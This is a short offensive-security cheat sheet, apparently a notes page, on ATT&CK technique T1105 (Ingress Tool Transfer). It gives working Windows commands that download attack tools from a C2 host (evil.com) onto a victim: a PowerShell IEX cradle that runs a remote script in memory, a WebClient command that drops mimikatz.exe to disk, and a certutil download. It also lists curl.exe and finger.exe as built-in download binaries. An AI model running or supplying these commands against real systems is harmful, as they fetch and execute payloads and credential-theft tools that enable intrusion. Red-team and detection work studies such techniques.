---
title: Ingress Tool Transfer
tags: [c2, file-transfer, download]
description: Downloading tools from an external C2 server to the victim.
date: 2024-01-02
---

# Ingress Tool Transfer (T1105)

Fetching the next stage.

## 1. PowerShell DownloadCradle
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```
*Note*: This executes in memory. To drop to disk:
```powershell
(New-Object Net.WebClient).DownloadFile('http://evil.com/mimikatz.exe', 'C:\Temp\mimi.exe')
```

## 2. Certutil (Again)
Useful for both lateral and ingress.
`certutil -urlcache -split -f http://evil.com/tool.exe`

## 3. Living off the Land Binaries (LOLBins)
- **Curl.exe**: Native in Windows 10+.
- **Finger.exe**: Can download files via Gopher protocol (obscure).
